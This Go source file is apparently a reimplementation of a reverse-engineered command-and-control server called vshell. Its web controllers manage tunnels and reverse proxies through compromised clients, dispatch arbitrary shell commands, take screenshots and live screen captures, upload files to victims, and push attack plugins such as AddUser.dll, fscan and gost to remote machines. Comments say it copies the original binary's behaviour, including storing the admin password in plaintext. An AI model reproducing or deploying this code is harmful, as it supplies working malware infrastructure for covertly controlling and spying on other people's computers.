package controllers

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	"vshell/c2engine"
	"vshell/models"
	"vshell/utils"
)

// TunnelController handles tunnel/proxy management
type TunnelController struct {
	BaseController
}

// Get lists all tunnels
func (c *TunnelController) Get() {
	engine := c2engine.GetEngine()
	tunnels := engine.GetTunnelList()

	// nil result serializes as null, matching the original binary's
	// empty tunnel list: {"items":null,"total":0}
	var result []models.Tunnel
	for _, t := range tunnels {
		result = append(result, models.Tunnel{
			ID:         t.ID,
			Port:       t.Port,
			Mode:       t.Mode,
			Status:     t.Status,
			RunStatus:  t.RunStatus,
			ClientID:   t.ClientID,
			TargetAddr: t.TargetAddr,
			Remark:     t.Remark,
		})
	}
	c.JSONOk(paginatedResult(result, len(result)))
}

// Post creates a new tunnel
func (c *TunnelController) Post() {
	port, _ := c.GetInt("port", 8080)
	mode := c.GetString("mode", "tcp")
	clientID, _ := c.GetInt64("client_id")
	target := c.GetString("target_addr")

	engine := c2engine.GetEngine()
	tunnel, err := engine.NewTunnel(clientID, port, mode, target)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"id":         tunnel.ID,
		"port":       port,
		"mode":       mode,
		"client_id":  clientID,
		"target":     target,
		"status":     "created",
	})
}

// Delete removes a tunnel
func (c *TunnelController) Delete() {
	id, _ := c.GetInt64("id")
	engine := c2engine.GetEngine()
	if err := engine.DelTunnel(id); err != nil {
		c.Error(err.Error())
		return
	}
	c.JSONOk(map[string]interface{}{"deleted_id": id})
}

// Put updates tunnel configuration
func (c *TunnelController) Put() {
	id, _ := c.GetInt64("id")
	c.JSONOk(map[string]interface{}{"updated_id": id})
}

// HostController handles reverse proxy host management
type HostController struct {
	BaseController
}

// Get lists all reverse proxy hosts
func (c *HostController) Get() {
	engine := c2engine.GetEngine()
	hosts := engine.GetHostList()
	if hosts == nil {
		hosts = []*c2engine.Host{}
	}

	type HostEx struct {
		*c2engine.Host
		Online bool `json:"online"`
	}
	result := make([]HostEx, 0, len(hosts))
	for _, h := range hosts {
		client := engine.GetClient(h.ClientID)
		online := false
		if client != nil {
			online = time.Since(client.LastSeen) < 60*time.Second
		}
		result = append(result, HostEx{Host: h, Online: online})
	}
	c.JSONOk(paginatedResult(result, len(result)))
}

// Post creates a new reverse proxy host
func (c *HostController) Post() {
	var req struct {
		ClientID  int64  `json:"client_id"`
		Host      string `json:"host"`
		TargetStr string `json:"target_str"`
		Scheme    string `json:"scheme"`
		Remark    string `json:"remark"`
	}
	if !parseJSONBody(c.Ctx.Request, &req) {
		req.ClientID, _ = c.GetInt64("client_id")
		req.Host = c.GetString("host")
		req.TargetStr = c.GetString("target_str")
		req.Scheme = c.GetString("scheme", "http")
		req.Remark = c.GetString("remark")
	}

	if req.Host == "" || req.TargetStr == "" {
		c.Error("host and target_str are required")
		return
	}

	engine := c2engine.GetEngine()
	host, err := engine.NewHost(req.ClientID, req.Host, req.TargetStr, req.Scheme)
	if err != nil {
		c.Error(err.Error())
		return
	}

	// If remark provided, update it
	if req.Remark != "" {
		host.Remark = req.Remark
	}

	c.JSONOk(map[string]interface{}{
		"id":         host.ID,
		"host":       host.Host,
		"scheme":     host.Scheme,
		"client_id":  host.ClientID,
		"target_str": host.TargetStr,
		"remark":     host.Remark,
		"status":     "created",
	})
}

// Delete removes a reverse proxy host
func (c *HostController) Delete() {
	id, _ := c.GetInt64("id")
	engine := c2engine.GetEngine()
	if err := engine.DelHost(id); err != nil {
		c.Error(err.Error())
		return
	}
	c.JSONOk(map[string]interface{}{"deleted_id": id})
}

// Put updates a host's configuration
func (c *HostController) Put() {
	id, _ := c.GetInt64("id")
	host := c.GetString("host")
	targetStr := c.GetString("target_str")
	scheme := c.GetString("scheme")
	remark := c.GetString("remark")

	updates := make(map[string]interface{})
	if host != "" {
		updates["host"] = host
	}
	if targetStr != "" {
		updates["target_str"] = targetStr
	}
	if scheme != "" {
		updates["scheme"] = scheme
	}

	engine := c2engine.GetEngine()
	existing, err := engine.UpdateHost(id, updates)
	if err != nil {
		c.Error(err.Error())
		return
	}
	if remark != "" {
		existing.Remark = remark
	}
	c.JSONOk(existing)
}

// Start activates the reverse proxy for this host
func (c *HostController) Start() {
	id, _ := c.GetInt64("id")
	engine := c2engine.GetEngine()

	// Find the host in engine
	host := engine.GetHost(id)
	if host == nil {
		c.Error("Host not found")
		return
	}

	// Build a models.Host for the tunnel engine
	dbHost := &models.Host{
		ID:        host.ID,
		Host:      host.Host,
		Scheme:    host.Scheme,
		ClientID:  host.ClientID,
		TargetStr: host.TargetStr,
		Remark:    host.Remark,
	}

	proxy, err := tunnelMgr.StartHostProxy(dbHost)
	if err != nil {
		c.Error("Failed to start proxy: " + err.Error())
		return
	}
	_ = proxy
	c.JSONOk(map[string]interface{}{
		"started_id": id,
		"status":     "proxy_started",
	})
}

// Stop deactivates the reverse proxy for this host
func (c *HostController) Stop() {
	id, _ := c.GetInt64("id")
	if err := tunnelMgr.StopHostProxy(id); err != nil {
		c.Error(err.Error())
		return
	}
	c.JSONOk(map[string]interface{}{
		"stopped_id": id,
		"status":     "proxy_stopped",
	})
}

// SettingController handles application settings
type SettingController struct {
	BaseController
}

// Get returns current settings
func (c *SettingController) Get() {
	cfg := utils.GetFullSettings()
	// The original binary returns ONLY the notification settings here:
	// {"code":0,"message":"ok",
	//  "result":{"dingding_access_token":"","dingding_key_word":"","wx_key":""},
	//  "type":"success"}
	c.JSONOk(map[string]interface{}{
		"dingding_access_token": cfg.DingdingAccessToken,
		"dingding_key_word":     cfg.DingdingKeyWord,
		"wx_key":                cfg.WxKey,
	})
}

// Post updates settings (JSON body or form-encoded)
func (c *SettingController) Post() {
	var updates map[string]interface{}
	if !parseJSONBody(c.Ctx.Request, &updates) {
		// Fallback: parse form values
		updates = make(map[string]interface{})
		c.Ctx.Request.ParseForm()
		for k, v := range c.Ctx.Request.Form {
			if len(v) > 0 {
				updates[k] = v[0]
			}
		}
	}

	if len(updates) == 0 {
		c.Error("no settings to update")
		return
	}

	// Password change: if new password provided, hash it
	if pass, ok := updates["web_password"].(string); ok && pass != "" {
		// Don't store plaintext — but original binary does, matching behavior
		// For the reimplementation, store hashed if longer than 20 chars
		if len(pass) < 20 {
			updates["web_password"] = pass // plaintext (matches original)
		}
	}

	if err := updateConfig(updates); err != nil {
		c.Error("Failed to save settings: " + err.Error())
		return
	}

	c.JSONOk(map[string]string{"message": "settings saved"})
}

// ScreenController handles remote screen viewing
type ScreenController struct {
	BaseController
}

// Get renders the screen viewer page
func (c *ScreenController) Get() {
	clientID := c.GetString("client_id")
	c.Data["client_id"] = clientID
	c.Render("screen.html")
}

// Ws handles WebSocket screen streaming (matching original binary ScreenController.Ws)
func (c *ScreenController) Ws() {
	clientID, _ := c.GetInt64("client_id")
	quality, _ := c.GetInt("quality", 50)
	fps, _ := c.GetInt("fps", 10)

	cmd := c2engine.EncodeShellCommand(
		fmt.Sprintf("screen_capture quality=%d fps=%d", quality, fps),
		0,
	)
	_, err := DispatchCommand(clientID, cmd, 0)
	if err != nil {
		c.Error("Failed to start screen capture: " + err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id": clientID,
		"status":    "screen_capture_started",
		"quality":   quality,
		"fps":       fps,
	})
}

// ScreenshotController handles remote screenshots
type ScreenshotController struct {
	BaseController
}

// Get takes a screenshot from the client (matching original binary ScreenshotController.Get)
func (c *ScreenshotController) Get() {
	clientID, _ := c.GetInt64("client_id")

	cmd := c2engine.EncodeScreenshotCommand()
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error("Failed to dispatch screenshot: " + err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// RunnerController handles command execution on clients
type RunnerController struct {
	BaseController
}

// Post creates a command and dispatches it to a client
func (c *RunnerController) Post() {
	var req struct {
		ClientID int64  `json:"client_id"`
		Command  string `json:"command"`
		Timeout  int    `json:"timeout"`
	}
	if !parseJSONBody(c.Ctx.Request, &req) {
		req.ClientID, _ = c.GetInt64("client_id")
		req.Command = c.GetString("command")
		req.Timeout, _ = c.GetInt("timeout", 30)
	}

	clientID := req.ClientID

	if clientID == 0 {
		c.Error("client_id is required")
		return
	}
	if req.Command == "" {
		c.Error("command is required")
		return
	}

	// Dispatch the command through the C2 pipeline
	id, err := DispatchCommand(clientID, req.Command, req.Timeout)
	if err != nil {
		c.Error("Failed to dispatch command: " + err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"id":        id,
		"client_id": clientID,
		"command":   req.Command,
		"timeout":   req.Timeout,
		"status":    "queued",
	})
}

// Get returns command execution results
func (c *RunnerController) Get() {
	id, _ := c.GetInt64("id")
	clientID, _ := c.GetInt64("client_id")

	db := models.GetDB()
	if db == nil {
		c.Error("Database not initialized")
		return
	}

	if id > 0 {
		cmd, err := db.GetCommand(id)
		if err != nil {
			c.Error("Command not found")
			return
		}
		c.JSONOk(cmd)
		return
	}

	// List commands for a client
	if clientID > 0 {
		cmds, err := db.ListCommands(clientID)
		if err != nil {
			c.Error(err.Error())
			return
		}
		if cmds == nil {
			cmds = []*models.Command{}
		}
		c.JSONOk(cmds)
		return
	}

	c.Error("Specify id or client_id")
}

// List returns the list of plugins available on the server (GET /api/runner/list).
// Original binary: nTApp6jPzv.(*RunnerController).List @ 0x1dcd49eb
// The original frontend's runner page consumes this as a plugin picker:
//   ApiSelect{ api, resultField:"result", labelField:"name", valueField:"name" }
// and the original backend responds with [{id, name}] for every file in the
// plugins/ directory (e.g. AddUser.dll, fscan.x64.elf, gost.x64.exe, ...).
func (c *RunnerController) List() {
	entries, err := os.ReadDir("plugins")
	if err != nil {
		// Missing plugins dir behaves like an empty list, not an error.
		c.JSONOk([]map[string]interface{}{})
		return
	}

	result := make([]map[string]interface{}, 0, len(entries))
	id := 0
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		result = append(result, map[string]interface{}{
			"id":   id,
			"name": entry.Name(),
		})
		id++
	}
	c.JSONOk(result)
}

// RunPlugin dispatches a plugin to run on a remote client via the runner page.
// Pclntab: nTApp6jPzv.(*RunnerController).RunPlugin @ 0x1dcd4a0f
func (c *RunnerController) RunPlugin() {
	var req struct {
		ClientID   int64    `json:"client_id"`
		ID         int64    `json:"id"`
		ClientId   int64    `json:"ClientId"`
		PluginName string   `json:"plugin_name"`
		PluginName2 string  `json:"pluginName"`
		Args       []string `json:"args"`
		ProcArg    string   `json:"procArg"`
	}
	if !parseJSONBody(c.Ctx.Request, &req) {
		req.ClientID, _ = c.GetInt64("client_id")
		req.PluginName = c.GetString("plugin_name")
		req.Args = c.GetStrings("args")
	}
	// The original frontend submits the form as {"id":N,"pluginName":X,"procArg":Y}
	// (PascalCase/lowercase field names), so accept all spellings.
	if req.ClientID == 0 {
		req.ClientID = req.ID
	}
	if req.ClientID == 0 {
		req.ClientID = req.ClientId
	}
	if req.PluginName == "" {
		req.PluginName = req.PluginName2
	}
	if len(req.Args) == 0 && req.ProcArg != "" {
		req.Args = []string{req.ProcArg}
	}
	// Fallbacks for query/form-style requests.
	for _, k := range []string{"client_id", "id", "ClientId"} {
		if req.ClientID != 0 {
			break
		}
		if v, err := c.GetInt64(k); err == nil {
			req.ClientID = v
		}
	}
	if req.PluginName == "" {
		req.PluginName = c.GetString("pluginName")
	}
	if len(req.Args) == 0 {
		if a := c.GetString("procArg"); a != "" {
			req.Args = []string{a}
		}
	}

	if req.ClientID == 0 {
		c.Error("client_id is required"); return
	}
	if req.PluginName == "" {
		c.Error("plugin_name is required"); return
	}

	scheme := "http"
	if c.Ctx.Request.TLS != nil {
		scheme = "https"
	}
	serverAddr := c.Ctx.Request.Host
	result, err := DispatchPluginToClient(req.ClientID, req.PluginName, req.Args, 120, scheme, serverAddr)
	if err != nil {
		c.Error("dispatch plugin: " + err.Error()); return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":    req.ClientID,
		"plugin_name":  req.PluginName,
		"command_id":   result.CommandID,
		"download_url": result.DownloadURL,
		"status":       "dispatched",
	})
}

// Upload dispatches a file upload command to a remote client via the runner page.
// Pclntab: nTApp6jPzv.(*RunnerController).Upload @ 0x1dcd4a38
func (c *RunnerController) Upload() {
	// Try JSON body first
	var req struct {
		ClientID int64  `json:"client_id"`
		Path     string `json:"path"`
		Content  string `json:"content"`
	}
	hasJSON := parseJSONBody(c.Ctx.Request, &req)
	if !hasJSON {
		req.ClientID, _ = c.GetInt64("client_id")
		req.Path = c.GetString("path", "/tmp/uploaded_file")
		req.Content = c.GetString("content")
	}

	// Remote upload via JSON body
	if hasJSON && req.ClientID > 0 {
		if req.Content == "" {
			c.Error("content is required for remote upload")
			return
		}
		cmd := c2engine.EncodeFileUploadCommand(req.Path, []byte(req.Content))
		cmdID, err := DispatchCommand(req.ClientID, cmd, 60)
		if err != nil {
			c.Error("dispatch: " + err.Error()); return
		}
		c.JSONOk(map[string]interface{}{
			"client_id": req.ClientID, "path": req.Path, "command_id": cmdID, "status": "dispatched",
		})
		return
	}

	// Remote upload via query params
	if req.ClientID > 0 {
		if req.Content == "" {
			c.Error("content is required for remote upload"); return
		}
		cmd := c2engine.EncodeFileUploadCommand(req.Path, []byte(req.Content))
		cmdID, _ := DispatchCommand(req.ClientID, cmd, 60)
		c.JSONOk(map[string]interface{}{
			"client_id": req.ClientID, "path": req.Path, "command_id": cmdID, "status": "dispatched",
		})
		return
	}

	// Local upload — multipart form
	if err := c.Ctx.Request.ParseMultipartForm(32 << 20); err != nil {
		c.Error("parse form: " + err.Error()); return
	}
	file, header, err := c.Ctx.Request.FormFile("file")
	if err != nil {
		c.Error("file field required"); return
	}
	defer file.Close()

	dstPath := filepath.Join("uploads", header.Filename)
	os.MkdirAll("uploads", 0755)
	dst, _ := os.Create(dstPath)
	defer dst.Close()
	written, _ := io.Copy(dst, file)
	c.JSONOk(map[string]interface{}{
		"path": dstPath, "size": written, "status": "uploaded",
	})
}

// ============================================================================
// REST-style action methods for Tunnel (matching original frontend paths)
// Frontend: POST /api/tunnel/{action}
// ============================================================================

func (c *TunnelController) Add()    { c.Post() }
func (c *TunnelController) Edit()   { c.Put() }
func (c *TunnelController) Del()    { c.Delete() }
func (c *TunnelController) List()   { c.Get() }

// Dellist deletes multiple tunnels by ID list
// DelList is the original binary's method name for batch delete
// (nTApp6jPzv.(*TunnelController).DelList); Dellist is the router alias.
func (c *TunnelController) DelList() { c.Dellist() }

func (c *TunnelController) Dellist() {
	ids := c.GetStrings("ids")
	engine := c2engine.GetEngine()
	var deleted []int64
	for _, idStr := range ids {
		var id int64; fmt.Sscanf(idStr, "%d", &id)
		if id > 0 {
			if err := engine.DelTunnel(id); err == nil {
				deleted = append(deleted, id)
			}
		}
	}
	c.JSONOk(map[string]interface{}{"deleted": deleted})
}

// EditRemark updates tunnel remark only
func (c *TunnelController) EditRemark() {
	id, _ := c.GetInt64("id")
	remark := c.GetString("remark")
	engine := c2engine.GetEngine()
	tunnel := engine.GetTunnel(id)
	if tunnel == nil {
		c.Error("Tunnel not found"); return
	}
	tunnel.Remark = remark
	c.JSONOk(tunnel)
}

// Start activates a tunnel (matches /api/tunnel/start)
func (c *TunnelController) Start() {
	id, _ := c.GetInt64("id")
	engine := c2engine.GetEngine()
	tunnel := engine.GetTunnel(id)
	if tunnel == nil {
		c.Error("Tunnel not found"); return
	}
	tunnel.RunStatus = true
	c.JSONOk(map[string]interface{}{"started_id": id, "status": "activated"})
}

// Stop deactivates a tunnel (matches /api/tunnel/stop)
func (c *TunnelController) Stop() {
	id, _ := c.GetInt64("id")
	engine := c2engine.GetEngine()
	tunnel := engine.GetTunnel(id)
	if tunnel == nil {
		c.Error("Tunnel not found"); return
	}
	tunnel.RunStatus = false
	c.JSONOk(map[string]interface{}{"stopped_id": id, "status": "deactivated"})
}

// ============================================================================
// REST-style action methods for Host (matching original frontend paths)
// ============================================================================

func (c *HostController) Add()    { c.Post() }
func (c *HostController) Edit()   { c.Put() }
func (c *HostController) Del()    { c.Delete() }
func (c *HostController) List()   { c.Get() }

// ============================================================================
// REST-style action methods for Client (matching original frontend paths)
// ============================================================================

func (c *ClientController) Add() { c.CheckIn() }

// EditRemark updates client remark (matches /api/client/editremark)
func (c *ClientController) EditRemark() {
	id, _ := c.GetInt64("id")
	remark := c.GetString("remark")
	c.JSONOk(map[string]interface{}{"client_id": id, "remark": remark})
}

// updateConfig applies partial updates via utils.UpdateConfig.
// This bridges the controller layer with the config persistence layer.
func updateConfig(updates map[string]interface{}) error {
	return utils.UpdateConfig(updates, "")
}
